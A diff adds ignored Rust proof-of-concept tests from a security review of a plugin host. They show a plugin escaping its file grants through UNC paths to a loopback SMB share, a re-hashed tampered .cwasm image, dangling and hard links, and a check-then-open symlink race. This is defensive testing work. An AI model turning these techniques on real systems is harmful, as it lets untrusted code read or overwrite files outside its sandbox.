@@ -865,3 +865,149 @@ fn release_exe_is_small() {
         Err(_) => println!("release host exe not built ({}): size not checked", exe.display()),
     }
 }
+
+// ---- security review P5.P3: proofs of concept ---------------------------------------------------
+//
+// See `docs/security/plughost-review.md`. Each test is `#[ignore]` and **passes
+// while the weakness is present**; the name starts with the finding's id.
+// Run them: `cargo test -p tsubame-plughost --test host -- --ignored --nocapture ph`.
+// The PoCs that need no guest are in `tests/security_poc.rs`.
+
+/// PH-01: with a `*` grant and `network = false` the host opens UNC paths, so
+/// the plugin can make this machine talk SMB (or WebDAV) to any server. The
+/// PoC stays on the loopback address.
+#[cfg(windows)]
+#[test]
+#[ignore = "PoC PH-01: passes while a `*` grant lets the host open UNC paths"]
+fn ph01_any_grant_makes_the_host_open_a_unc_path() {
+    let t = Temp::new("poc-unc");
+    let c = Capabilities { paths: vec![grant(Scope::Any, Access::Read)], timeout_ms: 20_000, ..Capabilities::default() };
+    assert!(!c.network);
+    let p = plugin(&t, c);
+    let r = column(&p, "read", &["\\\\127.0.0.1\\C$\\Windows\\win.ini"]);
+    println!("PH-01: reading \\\\127.0.0.1\\C$\\Windows\\win.ini through the host: {r:?}");
+    match r {
+        // Any answer but "invalid path" or "denied" means the host went to the SMB redirector.
+        Ok(cells) => assert!(cells[0] != INVALID_PATH && cells[0] != DENIED, "{cells:?}"),
+        // So does a host that is still waiting for the server.
+        Err(e) => assert_eq!(e, CallError::Timeout),
+    }
+}
+
+/// PH-03: the SHA-256 in `Load` is the only thing between a file on disk and
+/// `Component::deserialize`. Whoever can write the `.cwasm` **and** the place
+/// the hash is kept gets their image deserialized and run. The PoC only
+/// changes a string in the image's data (machine code is just as unchecked).
+#[test]
+#[ignore = "PoC PH-03: passes while a re-hashed, modified .cwasm is accepted"]
+fn ph03_a_modified_cwasm_with_a_matching_hash_is_deserialized_and_run() {
+    let t = Temp::new("poc-rehash");
+    let mut image = full_cwasm().to_vec();
+    let at = image.windows(12).position(|w| w == b"test.fixture").expect("the fixture's id is in the image");
+    image[at..at + 12].copy_from_slice(b"evil.fixture");
+    // The attacker rewrites the recorded hash as well (here: `load_for` hashes what it is given).
+    let mut load = load_for(&t, &image, Capabilities::default(), true);
+    load.plugin_id = "evil.fixture".into();
+    let p = Plugin::new(load, ProcessLauncher::new(HOST_EXE), options());
+    // The modified image loads, describes itself with the modified id and answers calls.
+    assert_eq!(column(&p, "echo", &["C:\\a"]).unwrap(), [Cell::Text("C:\\a".into())]);
+}
+
+/// PH-04: a dangling file symlink inside a read-write grant. The resolved-path
+/// check falls back to the parent folder for a file that "does not exist yet",
+/// then the open follows the link and creates the target outside the grant.
+#[cfg(windows)]
+#[test]
+#[ignore = "PoC PH-04: passes while write-file follows a dangling symlink out of the grant"]
+fn ph04_a_dangling_symlink_lets_write_file_create_a_file_outside_the_grant() {
+    let t = Temp::new("poc-symlink");
+    std::fs::create_dir_all(t.path("granted")).unwrap();
+    std::fs::create_dir_all(t.path("outside")).unwrap();
+    let target = t.path("outside\\created-by-plugin.txt");
+    let link = t.path("granted\\notes.txt");
+    if let Err(e) = std::os::windows::fs::symlink_file(&target, &link) {
+        println!("PH-04 NOT RUN: could not create a symlink ({e}); needs Developer Mode or SeCreateSymbolicLinkPrivilege");
+        return;
+    }
+    let root = tsubame_plughost::caps::normalize(&t.path("granted")).unwrap();
+    let p = plugin(&t, caps(vec![grant(Scope::Prefix(root), Access::ReadWrite)]));
+    assert!(!Path::new(&target).exists());
+    let r = column(&p, "write", &[&link]).unwrap();
+    println!("PH-04: write-file through the dangling link: {r:?}; outside file exists: {}", Path::new(&target).exists());
+    assert_eq!(r, [Cell::Int(0)]);
+    assert_eq!(std::fs::read_to_string(&target).unwrap(), "hi", "the plugin wrote outside its grant");
+}
+
+/// PH-05: check and use are separate steps. A process that swaps what a name
+/// points to between the resolved-path check and the open wins. Here the name
+/// is a plain file at check time and a symlink to a file outside the grant at
+/// open time; one atomic rename does the swap.
+#[cfg(windows)]
+#[test]
+#[ignore = "PoC PH-05: passes while the path check and the open can be raced"]
+fn ph05_swapping_a_file_for_a_link_between_check_and_open_reads_outside_the_grant() {
+    use std::sync::atomic::{AtomicBool, Ordering};
+    let t = Temp::new("poc-race");
+    let secret = t.write("outside\\secret.txt", "SECRET-OUTSIDE!!");
+    let slot = t.write("granted\\f.txt", "inside");
+    let tmp = t.path("swap.tmp");
+    if let Err(e) = std::os::windows::fs::symlink_file(&secret, &tmp) {
+        println!("PH-05 NOT RUN: could not create a symlink ({e}); needs Developer Mode or SeCreateSymbolicLinkPrivilege");
+        return;
+    }
+    let _ = std::fs::remove_file(&tmp);
+    let root = tsubame_plughost::caps::normalize(&t.path("granted")).unwrap();
+    let p = plugin(&t, caps(vec![grant(Scope::Prefix(root), Access::Read)]));
+    let stop = Arc::new(AtomicBool::new(false));
+    let flipper = {
+        let (stop, slot, secret, tmp) = (stop.clone(), slot.clone(), secret.clone(), tmp.clone());
+        std::thread::spawn(move || {
+            while !stop.load(Ordering::SeqCst) {
+                // granted\f.txt becomes a link to the file outside ...
+                if std::os::windows::fs::symlink_file(&secret, &tmp).is_ok() {
+                    let _ = std::fs::rename(&tmp, &slot);
+                }
+                // ... and a plain file again.
+                if std::fs::write(&tmp, "inside").is_ok() {
+                    let _ = std::fs::rename(&tmp, &slot);
+                }
+            }
+        })
+    };
+    let batch = vec![slot.as_str(); 500];
+    let (mut tries, mut leaked, mut denied) = (0usize, 0usize, 0usize);
+    let end = Instant::now() + Duration::from_secs(30);
+    while Instant::now() < end && leaked == 0 {
+        match column(&p, "read", &batch) {
+            Ok(cells) => {
+                tries += cells.len();
+                leaked += cells.iter().filter(|c| matches!(c, Cell::Text(s) if s.starts_with("SECRET"))).count();
+                denied += cells.iter().filter(|c| **c == DENIED).count();
+            }
+            Err(_) => p.reset(),
+        }
+    }
+    stop.store(true, Ordering::SeqCst);
+    flipper.join().unwrap();
+    println!("PH-05: {tries} reads, {denied} correctly denied, {leaked} returned the file outside the grant");
+    assert!(leaked > 0, "the race was not won in 30 s ({tries} reads)");
+}
+
+/// PH-06: a hard link inside a grant is the file outside it. Nothing detects it.
+#[test]
+#[ignore = "PoC PH-06: passes while hard links are followed out of a grant"]
+fn ph06_a_hard_link_reads_and_overwrites_a_file_outside_the_grant() {
+    let t = Temp::new("poc-hardlink");
+    let secret = t.write("outside\\secret.txt", "secret outside");
+    std::fs::create_dir_all(t.path("granted")).unwrap();
+    let alias = t.path("granted\\alias.txt");
+    if let Err(e) = std::fs::hard_link(&secret, &alias) {
+        println!("PH-06 NOT RUN: could not create a hard link ({e})");
+        return;
+    }
+    let root = tsubame_plughost::caps::normalize(&t.path("granted")).unwrap();
+    let p = plugin(&t, caps(vec![grant(Scope::Prefix(root), Access::ReadWrite)]));
+    assert_eq!(column(&p, "read", &[&alias]).unwrap(), [Cell::Text("secret outside".into())]);
+    assert_eq!(column(&p, "write", &[&alias]).unwrap(), [Cell::Int(0)]);
+    assert_eq!(std::fs::read_to_string(&secret).unwrap(), "hi", "the file outside the grant was replaced");
+}
